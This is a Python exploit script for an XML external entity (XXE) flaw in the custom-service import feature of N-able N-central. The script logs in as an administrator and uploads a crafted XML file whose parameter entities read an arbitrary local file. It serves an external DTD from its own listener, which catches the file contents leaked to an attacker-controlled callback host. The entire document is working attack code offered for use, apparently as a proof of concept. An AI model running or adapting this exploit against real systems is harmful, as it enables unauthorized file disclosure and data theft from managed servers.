#!/usr/bin/env python3
import argparse
import getpass
import os
import queue
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests
import urllib3


events = queue.Queue()
dtd = b""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        events.put((self.client_address[0], self.path, self.headers.get("User-Agent", "")))
        body = dtd if self.path.startswith("/external.dtd") else b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):
        pass


def main():
    global dtd
    p = argparse.ArgumentParser(description="N-central custom-service import XXE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--port", type=int, default=8000)
    p.add_argument("--file", default="/etc/hostname")
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    dtd = (
        f'<!ENTITY % send "<!ENTITY exfil SYSTEM \'http://{a.callback_host}:{a.port}/leak?value=%file;\'>">\n'
        "%send;\n"
    ).encode()
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE service [
<!ENTITY % file SYSTEM "file://{a.file}">
<!ENTITY % remote SYSTEM "http://{a.callback_host}:{a.port}/external.dtd">
%remote;
]>
<service xmlns="http://www.n-able.com" syntaxversion="1.1.0.0">&exfil;</service>'''

    server = ThreadingHTTPServer((a.listen_host, a.port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "xxe"}
    s.get(
        target + "/refreshNavAction.action",
        headers=headers,
        params={"ncentralTabId": "xxe", "custId": "1", "custName": "System"},
        timeout=30,
    )
    response = s.post(
        target + "/importingCustomServiceImportAction.action",
        headers=headers,
        data={"ncentralTabId": "xxe"},
        files={"importFile": ("service.xml", xml, "application/xml")},
        timeout=60,
    )
    print(f"login={login.status_code}")
    print(f"import={response.status_code}")
    for _ in range(2):
        client, path, agent = events.get(timeout=20)
        print(f"callback={client} {path} {agent}")
    server.shutdown()


if __name__ == "__main__":
    main()
